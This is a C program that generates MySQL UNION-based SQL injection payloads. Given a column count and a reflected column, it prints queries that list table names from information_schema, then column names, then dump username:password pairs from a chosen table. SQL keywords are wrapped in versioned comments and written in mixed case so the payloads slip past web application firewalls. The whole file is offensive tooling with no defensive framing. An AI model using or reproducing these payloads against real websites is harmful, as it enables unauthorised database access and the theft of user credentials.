#include<stdio.h>
#include<string.h>
main() {

	int num,i,vulnum;
	char tbname[100];
	printf("Enter the order by number : ");
	scanf("%d",&num);
	printf("/*!uNiOn*/ /*!sElEct*/ ");
	for(i=1;i<num;i++) {
		printf("%d,",i);
	}
	printf("%d--",i);
	printf("\n");
	printf("Enter the vul number : ");
	scanf("%d",&vulnum);

	printf("/*!uNiOn*/ /*!sElEct*/ ");
	for(i=1;i<num;i++) {// table retrieve
		if(vulnum==i)
			printf("/*!grOuP_coNcAt(table_name)*/,");
		else
			printf("%d,",i);
	}
	if(vulnum==i)
		printf("/*!grOup_coNcat(table_name)*/");
	else
		printf("%d",i);
	printf(" /*!from*/ /*!information_schema*/.tables /*!wheRe*/ /*!table_schema*/=database()--\n");

	printf("Enter the table name : ");      //columns
	scanf("%s",&tbname);
	printf("/*!uNiOn*/ /*!sElEct*/ ");
	for(i=1;i<num;i++) {
		if(vulnum==i)
			printf("/*!grOup_coNcaT(column_name)*/,");
		else
			printf("%d,",i);
	}
	if(vulnum==i)
		printf("/*!groUp_concaT(column_name)*/");
	else
		printf("%d",i);
	printf(" /*!frOm*/ /*!information_schema*/.tables /*!whErE*/ /*!table_name*/=");
	printf("CHAR(");
	for(i=0;i<strlen(tbname)-1;i++)
		printf("%d,",tbname[i]);
	printf("%d",tbname[i]);
	printf(")--");
	printf("\n");

	printf("/*!uNiOn*/ /*!sElEct*/ ");
	for(i=1;i<num;i++) {
		if(vulnum==i)
			printf("/*!groUp_coNcat(username,0x3a,password)*/,");
		else
			printf("%d,",i);
	}
	if(vulnum==i)
		printf("/*!grOup_coNcat(username,0x3a,password)*/");
	else
		printf("%d",i);
	printf(" /*!fRom*/ %s--\n",tbname);
}
